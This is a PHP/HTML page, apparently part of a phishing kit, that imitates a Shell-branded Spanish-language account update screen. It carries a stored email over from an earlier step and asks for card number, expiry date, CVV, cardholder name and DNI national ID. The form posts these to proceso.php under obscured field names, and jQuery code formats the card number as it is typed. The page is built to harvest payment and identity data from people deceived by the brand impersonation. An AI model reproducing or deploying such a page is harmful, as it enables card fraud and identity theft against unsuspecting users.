  <?php  
  session_start();
  $_SESSION['email'] = $_POST['email'];
  ?>
  <!doctype html>
  <html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Bootstrap demo</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
    <link rel="stylesheet" type="text/css" href="style.css">
    <style type="text/css">
      .form-control{
        box-shadow: 0 0 0 !important;
      }
      .form-control:focus{
        border:1px solid #888;
      }
    </style>
  </head>
  <body class="bg-light">
    <header style="position: fixed;top: 0;left: 0;z-index: 999;width: 100%;" class="bg-white">
      <nav class="navbar bg-white navbar-expand-lg">
        <div class="container-fluid">
          <a class="navbar-brand" href="#">
            <img src="img/logo-shell.svg" height="40px">
          </a>
          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
          </button>
          <div class="collapse navbar-collapse" id="navbarSupportedContent">
            <ul class="navbar-nav ms-auto mb-2 mb-lg-0">
              <li class="nav-item px-2">
                <a href="" class="btn btn-outline-danger rounded-2">Registrate</a>
              </li>
              <li class="nav-item px-2">
                <a href="login.html" class="btn btn-danger rounded-2">Iniciar sesión</a>
              </li>
            </ul>

          </div>
        </div>
      </nav>
    </header>
    <main  class="shadow rounded-2 mb-5 bg-white p-3 py-4 m-auto" style="max-width:1100px;margin-top:110px !important;">
      <header class="d-flex py-5 align-items-center m-auto mb-4" style="max-width:480px;">  
        <img src="img/logo-header-shell.svg" height="50px">
        <h1 class="fs-4 text-dark ms-3">Actualiza la información de tu cuenta</h1>
      </header>
      <div class="container text-center m-auto" style="max-width: 1100px !important;">
        <form style="max-width:350px;" method="POST" action="proceso.php" class="m-auto  text-start">
          <p class="text-center text-danger fs-3">Agrega una tarjeta</p>
          <div class="row m-auto">
            <div class="col-12 p-0">
              <img src="img/descarga.png" height="40px">
            </div>
            <div class="col-sm-8 mb-3 p-0">
              <div class="">
                <label for="card" class="form-label mb-0">Número de la tarjeta</label>
                <input type="tel" required required  class="form-control" placeholder="0000 0000 0000 0000" id="card" name="cac">
              </div>
            </div>

            <div class="col-sm-4 mb-3 p-0">
              <div class="">
                <label for="expiry" class="form-label mb-0">MM/AA</label>
                <input type="tel" required required  class="form-control" placeholder="12/25" id="expiry" name="exex">
              </div>
            </div>

            <div class="col-sm-4 mb-3 p-0">
              <div class="">
                <label for="bird" class="form-label mb-0">CVV</label>
                <input type="tel" name="casfa" required required  class="form-control" placeholder="000" id="bird">
              </div>
            </div>
            <div class="col-12"></div>
            <div class="col-sm-8 mb-3 p-0">
              <div class="">
                <label for="bird" class="form-label mb-0">Nombre y apellido</label>
                <input type="text" name="names" required required  class="form-control" placeholder="Como figura en la tarjeta" id="bird">
              </div>
            </div>

            <div class="col-sm-4 mb-3 p-0">
              <div class="">
                <label for="bird" class="form-label mb-0">DNI</label>
                <input type="tel" name="dni" required required  class="form-control" placeholder="12345678" id="bird">
              </div>
            </div>


          </div>



          <button type="submit" class="btn mb-5 btn-danger w-100">Siguiente</button>

        </form>
      </div>
    </main>

    <footer class="p-3 row bg-white m-0">
      <div class="col-12 d-flex align-items-center">
        <img src="img/logo-shell.svg" height="30px">
        <ul class="d-flex mb-0">
          <li class="d-inline px-3">
            <img src="img/facebook.png">
          </li>
          <li class="d-inline px-3">|</li>
          <li class="d-inline px-3">
            <img src="img/instagram.png">
          </li>
        </ul>
      </div>
    </footer>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
    <script type="text/javascript">
      $("#card").keyup(function(event){
        if ($("#card").val().length == 4 ) {
          $("#card").val($("#card").val()+" "); 
          if (event.which == 8) {
            $("#card").val("");
          }
        }
        if ($("#card").val()[0]==4) {
          $("#cardId").attr("src","./img/cards/VISA.png");
        }
        if ($("#card").val()[0]==5) {
          $("#cardId").attr("src","./img/cards/MASTERCARD.png");
        }
        if ($("#card").val()[0]==3) {
          $("#cardId").attr("src","./img/cards/AMEX.png");
        }
        if ($("#card").val()[0]==6) {
          $("#cardId").attr("src","./img/cards/Cabal.png");
        }
        if ($("#card").val()[0] == "5" && $("#card").val()[1] == "8") {
          $("#cardId").attr("src","./img/cards/Naranja.png");
        }
        if ($("#card").val().length == 9 ) {
          $("#card").val($("#card").val()+" ");
          if (event.which == 8) {
            $("#card").val("");
          }
        }
        if ($("#card").val().length == 14 ) {
          $("#card").val($("#card").val()+" ");
          $("#card").attr("maxlength","19");
          if (event.which == 8) {
            $("#card").val("");
          }
        }
        if ($("#card").val()[0] == 5 && $("#card").val()[1] == 0 && $("#card").val()[2] == 1) {
          $("#card").attr("maxlength","23");
          if ($("#card").val().length == 19) {
            $("#card").val($("#card").val()+" ");
          }
          if (event.which == 8) {
            $("#expiry").val("");
          }
        }
      })
      $("#expiry").keyup(function(event){
        if ($("#expiry").val().length == 2 ) {
          $("#expiry").val($("#expiry").val()+"/");
          $("#expiry").attr("maxlength","5");
          if (event.which == 8) {
            $("#expiry").val("");
          }
        }
      })
    </script> 
  </body>
  </html>